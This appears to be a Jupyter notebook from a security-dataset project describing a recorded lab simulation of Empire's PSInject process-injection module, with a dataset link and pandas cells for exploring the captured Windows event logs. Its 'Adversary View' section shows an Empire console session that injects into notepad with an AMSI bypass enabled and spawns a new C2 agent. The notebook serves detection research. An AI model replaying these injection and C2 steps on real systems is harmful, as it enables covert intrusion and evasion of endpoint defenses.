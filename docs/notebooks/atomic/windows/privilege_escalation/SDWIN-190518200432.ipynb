{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1b1db9c3",
   "metadata": {},
   "source": [
    "# Empire PSInject"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45868a66",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6e00d007",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0004](https://attack.mitre.org/tactics/TA0004),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1055.003](https://attack.mitre.org/techniques/T1055/003) |\n",
    "| Tags              | PE Injection,WriteProcessMemory,CreateRemoteThread Execution |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a1e5f75",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries reflectively loading/intecting a portable executable (PE) (not on disk) into a process via WriteprocessMemory and executed via CreateRemoteThread APIs"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5551f1f7",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "70e344ff",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_psinject_PEinjection.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_psinject_PEinjection.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "49e61980",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "561ccc65",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2a429806",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [PSInject](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08ab9483",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "[*] Active agents:\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \n",
    "F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:31:11  http            \n",
    "\n",
    "(Empire: agents) > interact F82SZKVW\n",
    "(Empire: F82SZKVW) > \n",
    "(Empire: F82SZKVW) > \n",
    "(Empire: F82SZKVW) > usemodule management/psinject\n",
    "(Empire: powershell/management/psinject) > \n",
    "(Empire: powershell/management/psinject) > set ProcName notepad\n",
    "(Empire: powershell/management/psinject) > set Listener http\n",
    "(Empire: powershell/management/psinject) > info\n",
    "\n",
    "              Name: Invoke-PSInject\n",
    "            Module: powershell/management/psinject\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "  @sixdub\n",
    "  leechristensen (@tifkin_)\n",
    "\n",
    "Description:\n",
    "  Utilizes Powershell to to inject a Stephen Fewer formed\n",
    "  ReflectivePick which executes PS codefrom memory in a remote\n",
    "  process. ProcID or ProcName must be specified.\n",
    "\n",
    "Comments:\n",
    "  http://sixdub.net\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        F82SZKVW                  Agent to run module on.                 \n",
    "  ProcId           False                                 ProcessID to inject into.               \n",
    "  ProcName         False       notepad                   Process name to inject into.            \n",
    "  Listener         True        http                      Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/management/psinject) > execute\n",
    "[*] Tasked F82SZKVW to run TASK_CMD_JOB\n",
    "[*] Agent F82SZKVW tasked with task ID 1\n",
    "[*] Tasked agent F82SZKVW to run module powershell/management/psinject\n",
    "(Empire: powershell/management/psinject) > \n",
    "Job started: F48GDZ\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent Y9RCLV64 checked in\n",
    "[+] Initial agent Y9RCLV64 from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to Y9RCLV64 at 172.18.39.5\n",
    "\n",
    "(Empire: powershell/management/psinject) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \n",
    "F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:32:51  http            \n",
    "Y9RCLV64 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       notepad            2576   5/0.0    2020-08-07 18:32:52  http            \n",
    "\n",
    "(Empire: agents) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0b6a657",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0522929",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fe9d651",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_psinject_PEinjection.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cfd6f295",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "291014a6",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f355789",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ae6374d",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "37f946af",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/) \n",
    "* [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
